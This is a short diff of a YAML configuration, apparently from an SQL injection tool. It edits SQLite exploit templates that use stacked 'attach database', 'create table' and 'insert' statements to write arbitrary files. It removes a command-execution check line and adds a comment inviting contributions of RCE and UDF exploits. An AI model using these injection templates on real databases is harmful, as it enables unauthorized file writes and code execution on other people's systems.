@@ -115,11 +115,11 @@ resource:
     concat: "|| '%7f' ||"
 
  exploit: |
+  # [contribute] share other file, RCE and UDF exploits on GitHub
   writeFile: |
-   ; attach database '%s' as %s
-   ; create table %s.%s (c text)
-   ; insert into %s.%s (c) values ("%s");
-  confirm: echo "iamin$((133707330+1))"
+    ; attach database '%s' as %s
+    ; create table %s.%s (c text)
+    ; insert into %s.%s (c) values ("%s")
 
 strategy:
  configuration:
